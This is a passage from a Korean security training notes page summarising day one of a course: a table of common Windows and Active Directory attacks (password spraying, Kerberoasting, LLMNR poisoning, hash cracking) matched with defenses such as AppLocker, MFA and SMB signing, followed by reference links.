    Mythos 관련 자세한 내용은 Anthropic 공식 자료([anthropic.com/glasswing](https://www.anthropic.com/glasswing))를 확인하세요.

---

## 1일차 정리 { #summary }

| 공격 | 핵심 방어 | 관련 레퍼런스 |
|---|---|---|
| 다운로드·바탕화면에서 악성 코드 첫 실행 | 애플리케이션 허용 목록 (AppLocker 경로 규칙) | [LOLBins](../../../adversary/lolbins.md) |
| 백신 우회 (고스트 라이팅·LOLBins) | 백신 하나에 의존하지 않는 다층 방어 | [프로세스 인젝션](../../../adversary/process-injection.md) |
| 패스워드 스프레이 | 긴 비번, 빠짐없는 MFA, 레거시 인증 차단 | [PsExec와 SMB](../../../adversary/psexec-smb.md) · [이벤트 ID](../../../basics/windows-event-ids.md) |
| 커버로스팅 | 서비스 계정 긴 비번·gMSA, 이벤트 4769 탐지 | [Kerberoasting](../../../adversary/kerberoasting.md) |
| LLMNR/NBT-NS 포이즈닝 (Responder) | 해당 프로토콜 끄기, SMB 서명 강제 | [LLMNR·NTLM 릴레이](../../../adversary/llmnr-ntlm-relay.md) |
| 해시 크래킹 | 긴 비번 (길이가 곧 크래킹 시간) | [SAM·NTDS 추출](../../../adversary/sam-ntds-extraction.md) · [Pass-the-Hash](../../../adversary/pass-the-hash.md) |

!!! quote ""
    공격자는 ① 악성 코드를 실행하거나 ② 패스워드를 얻어서 들어온다. 그러니 ① 허용된 곳에서만 실행되게 하고(AppLocker), ② 패스워드는 길게·MFA는 빈틈없이·서비스 계정은 철저히 관리하라. 그리고 패치가 없는 시대를 대비해 공격 범주 전체를 막는 통제를 갖춰라.

## 참고 자료 { #references }

- [Antisyphon Training](https://www.antisyphontraining.com/) · [Black Hills Information Security](https://www.blackhillsinfosec.com/)
- [Back Doors & Breaches](https://www.backdoorsandbreaches.com/)
- [MITRE ATT&CK — T1110.003 Password Spraying](https://attack.mitre.org/techniques/T1110/003/) · [T1558.003 Kerberoasting](https://attack.mitre.org/techniques/T1558/003/)
- 관련 페이지: [Kerberoasting](../../../adversary/kerberoasting.md) · [LLMNR·NTLM 릴레이](../../../adversary/llmnr-ntlm-relay.md) · [LOLBins](../../../adversary/lolbins.md) · [Pass-the-Hash](../../../adversary/pass-the-hash.md) · [Windows 이벤트 ID](../../../basics/windows-event-ids.md)
